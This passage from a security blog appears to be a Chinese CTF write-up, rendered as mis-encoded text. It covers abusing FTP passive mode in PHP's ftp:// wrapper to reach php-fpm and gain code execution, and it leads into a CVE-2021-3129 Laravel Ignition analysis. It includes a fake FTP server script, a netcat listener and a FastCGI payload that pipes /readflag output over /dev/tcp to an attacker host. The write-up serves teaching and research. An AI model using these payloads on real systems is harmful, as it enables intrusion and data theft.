php-fpm ç›‘å¬çš„ 9000 ç«¯å£ï¼Œè¯¦ç»†è¿‡ç¨‹æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå®é™…çš„ pasv ä¾‹å­æ¥ç†è§£ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">testbox1: &#123;/home/p-t/slacker/public_html&#125; % ftp -d testbox2</span><br><span class="line">Connected to testbox2.slacksite.com.</span><br><span class="line">220 testbox2.slacksite.com FTP server ready.</span><br><span class="line">Name (testbox2:slacker): slacker</span><br><span class="line">---&gt; USER slacker</span><br><span class="line">331 Password required for slacker.</span><br><span class="line">Password: TmpPass</span><br><span class="line">---&gt; PASS XXXX</span><br><span class="line">230 User slacker logged in.</span><br><span class="line">---&gt; SYST</span><br><span class="line">215 UNIX Type: L8</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; passive</span><br><span class="line">Passive mode on.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">ftp: setsockopt (ignored): Permission denied</span><br><span class="line">---&gt; PASV</span><br><span class="line">227 Entering Passive Mode (192,168,150,90,195,149).</span><br><span class="line">---&gt; LIST</span><br><span class="line">150 Opening ASCII mode data connection for file list</span><br><span class="line">drwx------   3 slacker    users         104 Jul 27 01:45 public_html</span><br><span class="line">226 Transfer complete.</span><br><span class="line">ftp&gt; quit</span><br><span class="line">---&gt; QUIT</span><br><span class="line">221 Goodbye.</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šæ˜¯å®¢æˆ·ç«¯ testbox1.slacksite.com (192.168.150.80) å‘å‡º <code>PASV</code> å‘½ä»¤ä»¥æŒ‡ç¤ºå…¶å°†ç­‰å¾…æœåŠ¡å™¨ testbox2.slacksite.com (192.168.150.90) â€œè¢«åŠ¨åœ°â€æä¾› ip å’Œç«¯å£å·ï¼Œç„¶åå®¢æˆ·ç«¯å°†åˆ›å»ºåˆ°æœåŠ¡å™¨çš„æ•°æ®è¿æ¥ï¼Œå…¶ä¸­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">227 Entering Passive Mode (192,168,150,90,195,149).</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯æœåŠ¡å™¨â€œè¢«åŠ¨â€è¿”å›çš„ ip å’Œç«¯å£å·ï¼Œåˆ†åˆ«æ˜¯ 32 ä½çš„ä¸»æœºåœ°å€å’Œ 16 ä½ tcp ç«¯å£åœ°å€ï¼Œè¿™ä¸ªä¾‹å­çš„å°±æ˜¯ 192.168.150.90 çš„ 195*256 + 149 =  50069 ç«¯å£ã€‚</p><p>é€‰æ‹© ip åœ°å€å’Œç«¯å£å·åï¼Œé€‰æ‹© ip åœ°å€å’Œç«¯å£çš„ä¸€æ–¹å°†å¼€å§‹ä¾¦å¬æŒ‡å®šçš„åœ°å€/ç«¯å£ï¼Œå¹¶ç­‰å¾…å¦ä¸€æ–¹è¿æ¥ã€‚ å½“å¯¹æ–¹è¿æ¥åˆ°æ”¶å¬æ–¹åï¼Œæ•°æ®ä¼ è¾“å¼€å§‹ã€‚</p><p>æˆ‘ä»¬è¿™é¢˜éœ€è¦å°† ip ç«¯å£é‡å®šå‘ä¸º 127.0.0.1:9000 æ¥è¯•å›¾ ssrf ï¼Œ9000 % 256 = 40 ï¼Œå³å¯è¡¨è¾¾ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">227 Entering Passive Mode (127,0,0,1,35,40).</span><br></pre></td></tr></table></figure></blockquote><p>ä»‹ç»åˆ°è¿™ï¼Œåˆ©ç”¨è¿‡ç¨‹å°±å¾ˆæ˜æ™°äº†ï¼Œå¼•ç”¨ <a href="https://github.com/dfyz/ctf-writeups/tree/master/hxp-2020/resonator">dfyz çš„ wp</a> åŸç†å›¾ï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/fake_ftp.png" alt="fake_ftp" style="zoom:80%;" /><p><code>file_put_contents()</code> ç”¨ <code>ftp://</code> ä¸æˆ‘ä»¬çš„æ¶æ„æœåŠ¡å™¨å»ºç«‹æ§åˆ¶è¿æ¥ï¼Œä½¿ç›®æ ‡å‘é€ <code>PASV</code> å‘½ä»¤ï¼Œæˆ‘ä»¬â€œè¢«åŠ¨â€æä¾› ip ç«¯å£è‡³æœ¬åœ° 9000 ç«¯å£ï¼Œç„¶åå»ºç«‹èµ·æ•°æ®è¿æ¥ï¼Œå°† data ï¼ˆfastcgi payloadï¼‰çš„å†…å®¹ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œæœ€ååªéœ€æ”»å‡»æœºç›‘å¬ payload ç»™å®šçš„ç«¯å£è·å– /readflag æ‰§è¡Œç»“æœå³å¯ã€‚</p><p>æˆ‘ä»¬ç”¨ py è„šæœ¬æ¥å®ç°è¿™ä¸ªæ¶æ„æœåŠ¡å™¨ï¼Œå…³äºå¦‚ä½•å»å®ç°ï¼Œæˆ‘ä»¬å¯ä»¥æœ¬åœ°æ­å»º ftp æœåŠ¡å™¨æµ‹è¯•è¢«åŠ¨çŠ¶æ€å‘æ–‡ä»¶ï¼Œè¿™é‡Œå‚ç…§äº†<a href="https://guokeya.github.io/post/gS01eEZwU/">è¿‡å®¢å¤§ç¥çš„wp</a> çš„å®éªŒå›¾ï¼ˆè¿™æ˜¯ EPSV æ‰©å±•è¢«åŠ¨æ¨¡å¼çš„æ•°æ®åŒ…ï¼Œä»…ä¾›å‚è€ƒï¼‰ï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/1610524338840.png" alt="1610524338840" style="zoom:80%;" /><blockquote><p>EPRT / EPSV</p><p>EPRT / EPSV æ¨¡å¼å‡ºç°çš„åŸå› æ˜¯ FTP ä»…ä»…æä¾›äº†å»ºç«‹åœ¨ IPv4 ä¸Šè¿›è¡Œæ•°æ®é€šä¿¡çš„èƒ½åŠ›ï¼Œå®ƒåŸºäºç½‘ç»œåœ°å€æ˜¯ 32 ä½è¿™ä¸€å‡è®¾ã€‚ä½†æ˜¯ï¼Œå½“ IPv6 å‡ºç°ä»¥åï¼Œåœ°å€å°±æ¯” 32 ä½é•¿è®¸å¤šäº†ã€‚åŸæ¥å¯¹ FTP è¿›è¡Œçš„æ‰©å±•åœ¨å¤šåè®®ç¯å¢ƒä¸­æœ‰æ—¶ä¼šå¤±è´¥ã€‚æˆ‘ä»¬å¿…é¡»é’ˆå¯¹ IPv6 å¯¹ FTP å†æ¬¡è¿›è¡Œæ‰©å±•ã€‚EPRTã€EPSVæ˜¯ Extended Port / Pasv çš„ç®€å†™ã€‚</p></blockquote><p>å¯ä»¥ä¾æ­¤å¾—åˆ° PASV æ¨¡å¼è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">port = <span class="number">5555</span></span><br><span class="line">sock = socket.socket()</span><br><span class="line">sock.bind((host, port))</span><br><span class="line">sock.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">conn, address = sock.accept()</span><br><span class="line">conn.send(<span class="string">&quot;220 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">&quot;331 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">&quot;230 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">&quot;200 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">&quot;550 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># skip EPSV</span></span><br><span class="line">conn.send(<span class="string">&quot;200 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 35 * 256 + 40 = 9000</span></span><br><span class="line">conn.send(<span class="string">&quot;227 127,0,0,1,35,40\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">&quot;150 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¤šå‘äº†ä¸€æ¬¡ <code>200</code> æ¥ <code>skip EPSV</code>ï¼Œå†å‘çš„ <code>227</code> æ¥æä¾› ip ç«¯å£ï¼Œä¸ºäº†ç†è§£ï¼Œå…ˆçœ‹æˆ‘ä»¬å•å‘ä¸€æ¬¡ 227 çš„æ˜¾ç¤ºï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210221031348301.png" alt="image-20210221031348301" style="zoom:80%;" /><p>å¯¹ç…§åŸç†å›¾ï¼Œè¿™å¹¶æœªæ‰§è¡Œ <code>STOR</code> å‘½ä»¤æ¥æ”¶æ•°æ®å¹¶ä¸”åœ¨æœåŠ¡å™¨ä¿å­˜ä¸ºæ–‡ä»¶ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬ä» <a href="https://github.com/php/php-src/blob/master/ext/standard/ftp_fopen_wrapper.c">php æºç </a> ä¸­å¯ä»¥çŸ¥æ™“ç­”æ¡ˆï¼ˆè¯¦ç»†çœ‹ä¸­æ–‡æ³¨è§£ï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &#123;&#123;&#123; php_fopen_do_pasv */</span></span><br><span class="line"><span class="built_in">static</span> unsigned short php_fopen_do_pasv(php_stream *stream, char *ip, size_t ip_size, char **phoststart)</span><br><span class="line">&#123;</span><br><span class="line">char tmp_line[<span class="number">512</span>];</span><br><span class="line"><span class="keyword">int</span> result, i;</span><br><span class="line">unsigned short portno;</span><br><span class="line">char *tpath, *ttpath, *hoststart=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#ifdef HAVE_IPV6</span></span><br><span class="line">    <span class="comment">// å…ˆè¯• EPSV æ¨¡å¼</span></span><br><span class="line"><span class="comment">/* We try EPSV first, needed for IPv6 and works on some IPv4 servers */</span></span><br><span class="line">php_stream_write_string(stream, <span class="string">&quot;EPSV\r\n&quot;</span>);</span><br><span class="line">result = GET_FTP_RESULT(stream);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœå¾—åˆ°çš„çŠ¶æ€ç ä¸æ˜¯ 229 æ‰è¯• PASV æ¨¡å¼ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬å•å‘ 227 ä¸èµ·ä½œç”¨ï¼Œä»…ä»…æ˜¯åˆ‡æ¢äº†æ¨¡å¼</span></span><br><span class="line"><span class="comment">/* check if we got a 229 response */</span></span><br><span class="line"><span class="keyword">if</span> (result != <span class="number">229</span>) &#123;</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"><span class="comment">/* EPSV failed, let&#x27;s try PASV */</span></span><br><span class="line">php_stream_write_string(stream, <span class="string">&quot;PASV\r\n&quot;</span>);</span><br><span class="line">result = GET_FTP_RESULT(stream);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¡®å®šæ”¶åˆ°äº† ip ç«¯å£å·</span></span><br><span class="line"><span class="comment">/* make sure we got a 227 response */</span></span><br><span class="line"><span class="keyword">if</span> (result != <span class="number">227</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ†ç¦» ip ç«¯å£å·</span></span><br><span class="line"><span class="comment">/* parse pasv command (129, 80, 95, 25, 13, 221) */</span></span><br><span class="line">tpath = tmp_line;</span><br><span class="line"><span class="comment">/* skip over the &quot;227 Some message &quot; part */</span></span><br><span class="line"><span class="keyword">for</span> (tpath += <span class="number">4</span>; *tpath &amp;&amp; !isdigit((<span class="keyword">int</span>) *tpath); tpath++);</span><br><span class="line"><span class="keyword">if</span> (!*tpath) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* skip over the host ip, to get the port */</span></span><br><span class="line">hoststart = tpath;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (; isdigit((<span class="keyword">int</span>) *tpath); tpath++);</span><br><span class="line"><span class="keyword">if</span> (*tpath != <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">*tpath=<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">tpath++;</span><br><span class="line">&#125;</span><br><span class="line">tpath[-<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">memcpy(ip, hoststart, ip_size);</span><br><span class="line">ip[ip_size-<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">hoststart = ip;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>Gopherus ç”Ÿæˆ fastcgi payload ï¼ˆå›¾ä¸­é€‰ä¸­éƒ¨åˆ†å¤åˆ¶ï¼‰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;/readflag &gt; /dev/tcp/192.168.21.128/6666&quot;</span><br></pre></td></tr></table></figure><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210221035533698.png" alt="image-20210221035533698"></p><p>è¿è¡Œ py è„šæœ¬æ­å»ºæ¶æ„ ftp æœåŠ¡å™¨</p><p>ç›‘å¬ 6666 ç«¯å£ï¼ˆè§† payload ç”Ÿæˆç«¯å£è€Œå®šï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6666</span><br></pre></td></tr></table></figure><p>ç½‘é¡µå‘é€ payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=ftp://server:5555/whatever&amp;data=[ç¬¬ä¸€æ­¥å¤åˆ¶çš„ payload ]</span><br></pre></td></tr></table></figure><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210221040044311.png" alt="image-20210221040044311" style="zoom:80%;" /><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210221040105384.png" alt="image-20210221040105384" style="zoom:80%;" /><p>getflag</p><h2 id="å›é¡¾"><a href="#å›é¡¾" class="headerlink" title="å›é¡¾"></a>å›é¡¾</h2><p>ç¯å¢ƒé…ç½®åŠåˆ†æç­‰å¯è§æˆ‘çš„ä¸Šä¸€ç¯‡æ–‡ç« ã€‚</p><p>CVE-2021-3129 å¯¹ç…§å¼•é¢˜å¯ä»¥ç²¾ç‚¼æˆä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line">file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$newContents</span>);</span><br></pre></td></tr></table></figure><p>å¼•é¢˜æ˜¯å…ˆ put å getï¼Œæˆ‘ä»¬å®Œå…¨é  put æ¥å®ç°ï¼Œput ä½¿æˆ‘ä»¬å»ºç«‹èµ·æ§åˆ¶è¿æ¥ï¼Œæœ‰ <code>data</code> è¿™ä¸ªå‚æ•°ä¼ é€ payload ã€‚</p><p>è¿™é‡Œå…ˆ get å put ï¼Œæƒ…å†µæœ‰æ‰€ä¸åŒï¼Œæ¼æ´ä½œè€…çš„æ€è·¯æ˜¯ï¼š</p><p>æˆ‘ä»¬å°†ä½¿ç”¨ <code>PASV</code> æ¥ä½¿ <code>file_get_contents()</code> åœ¨æ¶æ„æœåŠ¡å™¨ä¸Šä¸‹è½½æ–‡ä»¶ï¼Œå¹¶ä¸”å½“å®ƒå°è¯•ä½¿ç”¨ <code>file_put_contents()</code> å°†å…¶ä¸Šä¼ å›æ—¶ï¼Œæˆ‘ä»¬è®©å®ƒå‘é€æ–‡ä»¶åˆ° 127.0.0.1:9000 ï¼ˆæœ¬åœ°æœ‰ php-fpm æœåŠ¡ï¼Œå¯ä»¥å®ç°ç¨³å®š RCE ï¼‰ï¼Œå®é™…ä¸Šï¼Œget æ‰€åšçš„åªæ˜¯ä¸ºäº†ä»£æ›¿å¼•é¢˜çš„ data ä¼ é€ payload ã€‚</p><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/6-1614066679210.png" alt="6"></p><p>å¯¹æ­¤ï¼Œ<a href="https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247499853&idx=1&sn=225ce332407f61a2181b636e86545dab&chksm=">è¿™ç¯‡æ–‡ç« </a> å·²ç»å†™å¾—å¾ˆè¯¦å°½ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œåªä¸è¿‡å¯¹ç…§ä¸Šå›¾ï¼Œç›®æ ‡å’Œæ¶æ„ ftp æœåŠ¡å™¨éƒ½åœ¨æœ¬åœ°ï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥çš„ <code>227</code> æ˜¯æœ¬åœ°çš„ç«¯å£ã€‚</p><p><a href="https://github.com/Maskhe/evil_ftp/blob/master/evil_ftp.py">è„šæœ¬</a></p><p>å½“ç„¶ä¹Ÿå¯ä»¥å¯¹ç…§æˆ‘ä»¬é¢˜ç›®çš„è„šæœ¬æ¥æ”¹å†™ï¼Œç¬¬ä¸€æ¬¡è¿æ¥å‚ç…§ä¸‹å›¾å³å¯ï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210304154058020.png" alt="image-20210304154058020" style="zoom:80%;" /><p>ç¬¬äºŒæ¬¡è¿æ¥çš„è¿‡ç¨‹å®Œå…¨ç›¸åŒã€‚</p><p>å¦‚æœæƒ³è¦åœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹è¿™ä¸ª ftp ä¼ è¾“è¿‡ç¨‹ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢çš„åšå®¢æ­å»ºæœåŠ¡å™¨ï¼š</p><p><a href="https://www.cnblogs.com/zwqh/p/11579264.html">https://www.cnblogs.com/zwqh/p/11579264.html</a></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>ä¸ªäººè®¤ä¸ºå¾ˆä¸é”™çš„ ftp æ¨¡å¼è®²è§£ï¼š</p><p><a href="https://southrivertech.com/wp-content/uploads/FTP_Explained1.pdf">https://southrivertech.com/wp-content/uploads/FTP_Explained1.pdf</a></p><p><a href="https://slacksite.com/other/ftp.html">https://slacksite.com/other/ftp.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/37963548">https://zhuanlan.zhihu.com/p/37963548</a></p><p>ftp rfc æ–‡æ¡£ï¼š</p><p><a href="http://www.faqs.org/rfcs/rfc959.html">http://www.faqs.org/rfcs/rfc959.html</a></p><p>ftp å‘½ä»¤å­—å’Œå“åº”ç ï¼š</p><p><a href="https://blog.csdn.net/qq981378640/article/details/51254177">https://blog.csdn.net/qq981378640/article/details/51254177</a></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨åŸç†ç ”ç©¶ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ftpæ¨¡å¼ </tag>
            
            <tag> php-fpm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3129 Laravel Debug mode è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ</title>
      <link href="/posts/608ab632/"/>
      <url>/posts/608ab632/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ–‡ç« é¦–å‘äºå®‰å…¨å®¢ã€‚</p></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ˜¯ç¬”è€…ç¬¬ä¸€æ¬¡æ’°å†™æ¼æ´åˆ†æçš„æ–‡ç« ï¼ŒIgnition ä¸ªäººå¹¶æ²¡æœ‰æ·±å…¥çš„å¼€å‘ç»éªŒï¼Œæ‰€ä»¥æœ‰éƒ¨åˆ†å¯èƒ½å†™å¾—ä¸æ˜¯é‚£ä¹ˆâ€œå…¥è¡Œâ€ï¼Œåœ¨æµè§ˆäº†è®¸å¤šå®˜æ–¹æ–‡æ¡£ç²—ç•¥äº†è§£çš„æƒ…å†µä¸‹ï¼Œå¤ç°å¹¶åˆ†æäº†è¿™ä¸ªæ¼æ´ã€‚</p><p>æ€»ä¹‹ï¼Œå¦‚æœ‰ä¸å½“ï¼Œçƒ¦è¯·è¯„è®ºæ‰è™«ï¼Œæˆ‘ä¼šåœ¨ç¬¬ä¸€æ—¶é—´å“åº”å¹¶è¯„è®ºæç¤ºï¼Œè°¢è°¢ã€‚</p><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>Laravel æ˜¯åŸºäº MVC æ¨¡å¼çš„ php æ¡†æ¶ï¼Œæ›´å¤šæ¡†æ¶çŸ¥è¯†å¯å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/yimingwang/p/9781735.html">Laravel æ¡†æ¶åŸºç¡€çŸ¥è¯†æ€»ç»“</a></p><p><a href="https://learnku.com/docs/laravel/5.8">Laravel 5.8 ä¸­æ–‡æ–‡æ¡£</a></p><p>Ignition æ˜¯ Laravel 6 åº”ç”¨ç¨‹åºçš„é»˜è®¤å¯è‡ªå®šä¹‰çš„é”™è¯¯é¡µé¢ï¼Œå®ƒå…è®¸åœ¨ Flare ä¸Šå…¬å¼€åˆ†äº«é”™è¯¯ã€‚ å¦‚æœä½¿ç”¨æœ‰æ•ˆçš„ Flare API key è¿›è¡Œé…ç½®ï¼Œåˆ™ä¼šè·Ÿè¸ªåœ¨åº”ç”¨ç¨‹åºä¸­å‘ç”Ÿçš„é”™è¯¯ï¼ŒåŒ…æ‹¬å †æ ˆè·Ÿè¸ªã€‚</p><p><a href="https://github.com/facade/ignition">Ignition é¡¹ç›®åœ°å€</a></p><p><a href="https://flareapp.io/docs/ignition-for-laravel/installation">Ignition å®˜æ–¹æ–‡æ¡£</a></p><p>è¿™ç¯‡å»ºè®®é˜…è¯»ï¼Œä¼šå¸®åŠ©åç»­ç†è§£ï¼š</p><p><a href="https://learnku.com/laravel/t/33857">Laravel Ignition åŠŸèƒ½å…¨è§£æ</a> </p><h3 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>åœ¨ Debug æ¨¡å¼ä¸‹ï¼ŒLaravel å†…ç½®çš„ Ignition åŠŸèƒ½æŸäº›æ¥å£æœªä¸¥æ ¼è¿‡æ»¤è¾“å…¥æ•°æ®ï¼Œå¯¼è‡´ <code>file_get_contents()</code> å’Œ <code>file_put_contents()</code> å‡½æ•°ä½¿ç”¨ä¸å®‰å…¨ï¼Œä»è€Œä½¿æ”»å‡»è€…èƒ½å¤Ÿä½¿ç”¨æ¶æ„æ—¥å¿—æ–‡ä»¶å¼•èµ· phar ååºåˆ—åŒ–æ”»å‡»ï¼Œè¿œç¨‹æ‰§è¡Œä»£ç å¹¶æœ€ç»ˆè·å¾—æœåŠ¡å™¨æƒé™ã€‚</p><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><ul><li>Laravel &lt; 8.4.3</li><li>Facade Ignition &lt; 2.5.2</li></ul><h3 id="é…ç½®å®éªŒç¯å¢ƒ"><a href="#é…ç½®å®éªŒç¯å¢ƒ" class="headerlink" title="é…ç½®å®éªŒç¯å¢ƒ"></a>é…ç½®å®éªŒç¯å¢ƒ</h3><p><a href="https://github.com/SNCKER/CVE-2021-3129">https://github.com/SNCKER/CVE-2021-3129</a></p><p>å…·ä½“é…ç½®å‚ç…§é¡¹ç›®çš„é£Ÿç”¨æ–¹æ³•ï¼Œ<code>generate app key</code> åˆ·æ–°æ˜¾ç¤ºå¦‚ä¸‹é¡µé¢å³æˆåŠŸã€‚</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210209002233665.png" alt="image-20210209002233665" style="zoom:80%;" /><p>åŒæ—¶æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªå·¥å…· <a href="https://github.com/ambionics/phpggc">phpggc</a> ç”Ÿæˆ payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ambionics/phpggc.git</span><br></pre></td></tr></table></figure><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><p>ä»¥ <a href="https://github.com/facade/ignition/releases/tag/2.5.1">Ignition 2.5.1</a> æºä»£ç å®¡è®¡ã€‚</p><p>åœ¨åŠŸèƒ½è§£æçš„æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“ Igniton æœ‰å¾ˆå¤šå»ºè®®çš„è§£å†³æ–¹æ¡ˆï¼Œè¿™å¯¹åº”ç€æºç ä¸­çš„ <code>Solutions</code>ï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210209000543292.png" alt="image-20210209000543292" style="zoom: 80%;" /><p>æˆ‘ä»¬é…ç½®ç¯å¢ƒåšçš„ <code>generate app key</code> ä¹Ÿåœ¨å…¶ä¸­ã€‚</p><p>æ¼æ´æˆå› å‡ºè‡ª <code>MakeViewVariableOptionalSolution.php</code>  è¿™ä¸ªæ–‡ä»¶è¿‡æ»¤ä¸ä¸¥ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œå‡å¦‚æˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªæœªçŸ¥å˜é‡ï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210209003307547.png" alt="image-20210209003307547" style="zoom: 80%;" 